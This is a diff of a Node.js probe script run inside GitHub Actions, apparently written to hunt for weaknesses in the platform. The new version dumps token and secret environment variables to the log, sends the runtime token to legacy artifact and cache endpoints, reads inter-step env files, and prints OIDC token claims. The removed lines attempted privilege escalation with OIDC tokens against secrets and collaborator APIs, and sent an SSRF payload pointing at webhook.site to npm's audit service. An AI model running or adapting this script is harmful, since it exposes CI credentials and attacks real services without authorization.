@@ -1,172 +1,179 @@
 const https = require('https');
+const crypto = require('crypto');
+
+// v19: Probe ACTIONS_RUNTIME_URL + ACTIONS_CACHE_URL
+// These were passed to Docker containers in the Jekyll Pages build via -e flags
+// Checking if they're still alive and exploitable in shell steps too
 
 const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
 const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
 const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
-const GITHUB_REPOSITORY_ID = process.env.GITHUB_REPOSITORY_ID || '';
-const GITHUB_ACTOR = process.env.GITHUB_ACTOR || '';
 const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
-const RUN_NUMBER = process.env.GITHUB_RUN_NUMBER || '';
+const ACTIONS_ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
 
-function apiGet(hostname, path, auth) {
+// The old-style APIs
+const RUNTIME_URL = process.env.ACTIONS_RUNTIME_URL || '';
+const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
+const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';
+const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
+
+// Also check GITHUB_STATE and GITHUB_OUTPUT (inter-step comms)
+const GITHUB_STATE = process.env.GITHUB_STATE || '';
+const GITHUB_OUTPUT = process.env.GITHUB_OUTPUT || '';
+const GITHUB_ENV = process.env.GITHUB_ENV || '';
+const RUNNER_TEMP = process.env.RUNNER_TEMP || '';
+
+function get(hostname, path, token) {
   return new Promise((resolve) => {
     const r = https.request({ hostname, path, method: 'GET',
-      headers: { 'Authorization': 'Bearer ' + auth, 'User-Agent': 'GitHub-Actions-Probe', 'Accept': 'application/vnd.github.v3+json' }
-    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
+      headers: { 'Authorization': 'Bearer ' + token, 'Accept': 'application/json' }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400) })); });
     r.on('error', e => resolve({ status: 'ERR', body: e.message }));
     r.end();
   });
 }
 
-function oidcGet(hostname, path, token, extraHeaders) {
+function post(hostname, path, token, body) {
   return new Promise((resolve) => {
-    const r = https.request({ hostname, path, method: 'GET',
-      headers: { 'Authorization': 'Bearer ' + token, ...(extraHeaders || {}) }
-    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
+    const s = typeof body === 'string' ? body : JSON.stringify(body);
+    const r = https.request({ hostname, path, method: 'POST',
+      headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s), 'Accept': 'application/json' }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 600) })); });
     r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    r.end();
+    r.write(s); r.end();
   });
-}
-
-async function getOidcJwt(audience) {
-  const oidcParsed = new URL(OIDC_URL);
-  const path = oidcParsed.pathname + oidcParsed.search + '&audience=' + encodeURIComponent(audience);
-  const r = await oidcGet(oidcParsed.hostname, path, OIDC_TOKEN);
-  if (r.status === 200) {
-    try { return JSON.parse(r.body).value; } catch(e) { return null; }
-  }
-  return null;
 }
 
 async function main() {
-  if (!OIDC_URL || !OIDC_TOKEN || !GITHUB_TOKEN) { console.log('Missing env'); return; }
-  console.log('=== V18: OIDC JWT as GitHub API Auth + npm Audit SSRF + Scope Elevation ===');
-  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID, '| Actor:', GITHUB_ACTOR);
+  console.log('=== V19: ACTIONS_RUNTIME_URL + ACTIONS_CACHE_URL probe ===');
+  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID);
 
-  // === PART 1: Get OIDC JWT for api.github.com ===
-  console.log('\n=== PART 1: Get OIDC JWT for api.github.com audience ===');
-  const oidcJwt = await getOidcJwt('api.github.com');
-  if (!oidcJwt) { console.log('Failed to get OIDC JWT'); return; }
-  const oidcPayload = JSON.parse(Buffer.from(oidcJwt.split('.')[1], 'base64url').toString());
-  console.log('OIDC JWT obtained | aud:', oidcPayload.aud, '| sub:', oidcPayload.sub, '| exp:', new Date(oidcPayload.exp * 1000).toISOString());
-
-  // === PART 2: Try OIDC JWT as GitHub API auth ===
-  console.log('\n=== PART 2: OIDC JWT as GitHub API Bearer token ===');
-  const endpoints = [
-    '/user',                                          // Who am I?
-    '/user/repos?per_page=1',                         // List my repos?
-    '/repos/' + GITHUB_REPOSITORY,                    // My own repo
-    '/repos/' + GITHUB_REPOSITORY + '/actions/secrets', // Our own secrets (need admin)
-    '/repos/' + GITHUB_REPOSITORY + '/actions/variables', // Variables
-    '/orgs/' + GITHUB_ACTOR + '/members?per_page=1',  // Org members
-    '/repos/github/docs',                             // Third-party public repo
-    '/repos/github/docs/contents/README.md',          // Third-party content
-  ];
-
-  for (const ep of endpoints) {
-    const withOidc = await apiGet('api.github.com', ep, oidcJwt);
-    const withGithub = await apiGet('api.github.com', ep, GITHUB_TOKEN);
-    const oidcBody = withOidc.body.substring(0, 80);
-    const githubBody = withGithub.body.substring(0, 80);
-    if (withOidc.status !== withGithub.status) {
-      console.log('!!! DIFF ' + ep + ': OIDC=' + withOidc.status + ' vs GH_TOKEN=' + withGithub.status);
-      console.log('    OIDC body:', oidcBody);
-      console.log('    GH_TOKEN body:', githubBody);
-    } else {
-      console.log('[OIDC_API] ' + ep + ': status=' + withOidc.status + ' | oidc_body=' + oidcBody.substring(0, 60));
+  // === PART 1: Full env dump — what ACTIONS_* vars exist? ===
+  console.log('\n=== PART 1: ACTIONS_* + runner env vars ===');
+  const allKeys = Object.keys(process.env).sort();
+  for (const k of allKeys) {
+    if (/ACTIONS|RUNNER|GITHUB|RUNTIME|CACHE|OIDC|TOKEN|SECRET/.test(k)) {
+      const v = process.env[k] || '';
+      const preview = v.length > 60 ? v.substring(0, 60) + '...(len=' + v.length + ')' : v;
+      console.log('[ENV] ' + k + '=' + preview);
     }
   }
 
-  // === PART 3: Try OIDC JWT to access secrets API (should be blocked) ===
-  console.log('\n=== PART 3: OIDC JWT scope elevation test ===');
-  // GITHUB_TOKEN with id-token: write, contents: read, metadata: read
-  // Can OIDC JWT access secrets (would require secrets: read)?
-  const secretsEndpoints = [
-    '/repos/' + GITHUB_REPOSITORY + '/actions/secrets',
-    '/orgs/' + GITHUB_ACTOR + '/actions/secrets',
-    '/repos/' + GITHUB_REPOSITORY + '/environments',
-    '/repos/' + GITHUB_REPOSITORY + '/deployments',
-    '/repos/' + GITHUB_REPOSITORY + '/collaborators',
-  ];
-  for (const ep of secretsEndpoints) {
-    const withOidc = await apiGet('api.github.com', ep, oidcJwt);
-    const withGithub = await apiGet('api.github.com', ep, GITHUB_TOKEN);
-    const diff = withOidc.status !== withGithub.status ? ' !!!DIFF!!!' : '';
-    console.log('[SCOPE] ' + ep.split('/').slice(-2).join('/') + ': OIDC=' + withOidc.status + ' GH=' + withGithub.status + diff);
-    if (diff) {
-      console.log('  OIDC:', withOidc.body.substring(0, 100));
-      console.log('  GH_TOKEN:', withGithub.body.substring(0, 100));
+  // === PART 2: Test ACTIONS_RUNTIME_URL (old REST API) ===
+  console.log('\n=== PART 2: ACTIONS_RUNTIME_URL (old pipeline API) ===');
+  if (RUNTIME_URL) {
+    const u = new URL(RUNTIME_URL);
+    console.log('RUNTIME_URL:', RUNTIME_URL.substring(0, 80));
+    console.log('RUNTIME_TOKEN len:', RUNTIME_TOKEN.length);
+    // Old API endpoints
+    const oldPaths = [
+      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/artifacts',
+      '/_apis/build/artifacts?buildId=' + GITHUB_RUN_ID + '&api-version=6.0',
+      '/_apis/distributedtask/hubs/build/plans/' + ACTIONS_ORCHESTRATION_ID.split('.')[0] + '/artifacts',
+      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/jobs',
+      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/jobs/0/steps',
+    ];
+    for (const p of oldPaths) {
+      const r = await get(u.hostname, p, RUNTIME_TOKEN);
+      console.log('[RUNTIME] ' + p.split('/').slice(-2).join('/') + ': ' + r.status + ' | ' + r.body.substring(0, 120));
+    }
+  } else {
+    console.log('[RUNTIME] ACTIONS_RUNTIME_URL is NOT SET in shell env');
+  }
+
+  // === PART 3: Test ACTIONS_CACHE_URL (old cache REST API) ===
+  console.log('\n=== PART 3: ACTIONS_CACHE_URL (old cache API) ===');
+  if (CACHE_URL) {
+    const u = new URL(CACHE_URL);
+    console.log('CACHE_URL:', CACHE_URL.substring(0, 80));
+    // Old cache API (REST, pre-Twirp)
+    const cachePaths = [
+      '/_apis/artifactcache/cache',
+      '/_apis/artifactcache/caches',
+      '/_apis/artifactcache/cache?keys=test&version=abc',
+    ];
+    for (const p of cachePaths) {
+      const r = await get(u.hostname, p, RUNTIME_TOKEN);
+      console.log('[CACHE] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
+    }
+  } else {
+    console.log('[CACHE] ACTIONS_CACHE_URL is NOT SET in shell env');
+  }
+
+  // === PART 4: Test ACTIONS_RESULTS_URL (Twirp endpoint — may be gone) ===
+  console.log('\n=== PART 4: ACTIONS_RESULTS_URL (Twirp API) ===');
+  if (RESULTS_URL) {
+    console.log('RESULTS_URL present:', RESULTS_URL.substring(0, 80));
+  } else {
+    console.log('[RESULTS] ACTIONS_RESULTS_URL is NOT SET (confirmed gone in 20260611.554)');
+  }
+
+  // === PART 5: Check if GITHUB_OUTPUT/ENV file can be read (inter-step injection) ===
+  console.log('\n=== PART 5: GitHub file commands (inter-step comms) ===');
+  const fs = require('fs');
+  console.log('GITHUB_OUTPUT path:', GITHUB_OUTPUT || 'NOT_SET');
+  console.log('GITHUB_ENV path:', GITHUB_ENV || 'NOT_SET');
+  console.log('GITHUB_STATE path:', GITHUB_STATE || 'NOT_SET');
+  console.log('RUNNER_TEMP:', RUNNER_TEMP || 'NOT_SET');
+
+  if (GITHUB_OUTPUT) {
+    try {
+      const existing = fs.readFileSync(GITHUB_OUTPUT, 'utf8');
+      console.log('[OUTPUT] Current GITHUB_OUTPUT contents:', existing || '(empty)');
+    } catch(e) { console.log('[OUTPUT] Cannot read GITHUB_OUTPUT:', e.message); }
+    // Can we inject into GITHUB_ENV to set env vars for subsequent steps?
+    // This is legitimate within our own job, but interesting for understanding the mechanic
+    try {
+      const testContent = fs.readFileSync(GITHUB_ENV, 'utf8');
+      console.log('[ENV_FILE] Current GITHUB_ENV contents:', testContent.substring(0, 200) || '(empty)');
+    } catch(e) { console.log('[ENV_FILE] Cannot read GITHUB_ENV:', e.message); }
+  }
+
+  // === PART 6: OIDC token analysis — check issuer_scope and enterprise claims ===
+  console.log('\n=== PART 6: OIDC JWT full claim analysis ===');
+  if (OIDC_URL && OIDC_TOKEN) {
+    const u = new URL(OIDC_URL);
+    const path = u.pathname + u.search + '&audience=api.github.com';
+    const r = await get(u.hostname, path, OIDC_TOKEN);
+    if (r.status === 200) {
+      try {
+        const jwt = JSON.parse(r.body).value;
+        const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
+        console.log('[OIDC_CLAIMS] ALL CLAIMS:');
+        for (const [k, v] of Object.entries(payload)) {
+          console.log('  ' + k + ' = ' + JSON.stringify(v));
+        }
+        // Specifically check enterprise claims
+        console.log('[OIDC] enterprise:', payload.enterprise || 'NOT_PRESENT');
+        console.log('[OIDC] enterprise_id:', payload.enterprise_id || 'NOT_PRESENT');
+        console.log('[OIDC] issuer_scope:', payload.issuer_scope || 'NOT_PRESENT');
+        console.log('[OIDC] runner_environment:', payload.runner_environment || 'NOT_PRESENT');
+        console.log('[OIDC] check_run_id:', payload.check_run_id || 'NOT_PRESENT');
+      } catch(e) { console.log('[OIDC] Parse error:', e.message); }
     }
   }
 
-  // === PART 4: OIDC JWT for wrong audience used against GH API ===
-  console.log('\n=== PART 4: Cross-audience OIDC JWT test ===');
-  const audiences = ['sts.amazonaws.com', 'api.github.com', 'management.azure.com'];
-  for (const aud of audiences) {
-    const jwt = await getOidcJwt(aud);
-    if (!jwt) { console.log('[XAUD] ' + aud + ': JWT fetch failed'); continue; }
-    const p = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
-    const r = await apiGet('api.github.com', '/user', jwt);
-    console.log('[XAUD] aud=' + aud + ': JWT_aud=' + JSON.stringify(p.aud) + ' → API /user: ' + r.status + ' | ' + r.body.substring(0, 60));
-  }
-
-  // === PART 5: npm audit endpoint SSRF test from runner ===
-  console.log('\n=== PART 5: npm audit endpoint SSRF ===');
-  // npm audit sends POST to /-/npm/v1/security/audits/quick
-  // The body is a package-lock.json structure. Is there SSRF in any fetched URL?
-  const npmAuditPayload = JSON.stringify({
-    name: 'test',
-    version: '1.0.0',
-    requires: {},
-    dependencies: {
-      'test-pkg': {
-        version: '1.0.0',
-        resolved: 'https://webhook.site/ssrf-test',  // SSRF test URL
-        integrity: 'sha512-abc',
-        requires: {}
+  // === PART 7: Try old-style cache API on OIDC host ===
+  console.log('\n=== PART 7: Old cache API on new OIDC host ===');
+  if (OIDC_URL) {
+    const u = new URL(OIDC_URL);
+    const poolId = u.pathname.split('/')[1];
+    // Try old cache endpoints on the new host
+    const cachePaths = [
+      '/_apis/artifactcache/cache',
+      '/api/v3/artifactcache/cache',
+      '/' + poolId + '/caches',
+      '/' + poolId + '//caches/list',
+    ];
+    for (const p of cachePaths) {
+      const r = await get(u.hostname, p, OIDC_TOKEN);
+      if (r.status !== 404 && !r.body.includes('hmac is missing')) {
+        console.log('[LEGACY_CACHE] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
       }
     }
-  });
-
-  const npmAuditReq = new Promise((resolve) => {
-    const buf = Buffer.from(npmAuditPayload);
-    const r = https.request({
-      hostname: 'registry.npmjs.org', path: '/-/npm/v1/security/audits/quick',
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Content-Length': buf.length }
-    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 300) })); });
-    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    r.write(buf); r.end();
-  });
-  const npmAuditResult = await npmAuditReq;
-  console.log('[NPM_AUDIT] POST /-/npm/v1/security/audits/quick:', npmAuditResult.status, '|', npmAuditResult.body.substring(0, 200));
-
-  // === PART 6: Check if current run's artifacts are accessible from different repo ===
-  console.log('\n=== PART 6: Current run context info ===');
-  // Get the current run's artifact listing using OIDC JWT vs GITHUB_TOKEN
-  const artifactPath = '/repos/' + GITHUB_REPOSITORY + '/actions/runs/' + GITHUB_RUN_ID + '/artifacts';
-  const artOidc = await apiGet('api.github.com', artifactPath, oidcJwt);
-  const artGH = await apiGet('api.github.com', artifactPath, GITHUB_TOKEN);
-  console.log('[ARTIFACT] OIDC auth → run artifacts:', artOidc.status, '|', artOidc.body.substring(0, 100));
-  console.log('[ARTIFACT] GH_TOKEN auth → run artifacts:', artGH.status, '|', artGH.body.substring(0, 100));
-
-  // === PART 7: GraphQL with OIDC JWT ===
-  console.log('\n=== PART 7: GraphQL with OIDC JWT ===');
-  const gqlQuery = JSON.stringify({ query: '{ viewer { login } }' });
-  const gqlReq = (auth) => new Promise((resolve) => {
-    const buf = Buffer.from(gqlQuery);
-    const r = https.request({
-      hostname: 'api.github.com', path: '/graphql', method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + auth, 'Content-Type': 'application/json', 'Content-Length': buf.length, 'User-Agent': 'GitHub-Actions-Probe' }
-    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
-    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    r.write(buf); r.end();
-  });
-  const gqlOidc = await gqlReq(oidcJwt);
-  const gqlGH = await gqlReq(GITHUB_TOKEN);
-  console.log('[GQL] OIDC JWT viewer.login:', gqlOidc.status, '|', gqlOidc.body.substring(0, 100));
-  console.log('[GQL] GH_TOKEN viewer.login:', gqlGH.status, '|', gqlGH.body.substring(0, 100));
+    console.log('[LEGACY_CACHE] done (404s and hmac-errors suppressed)');
+  }
 
   console.log('\nDone.');
 }
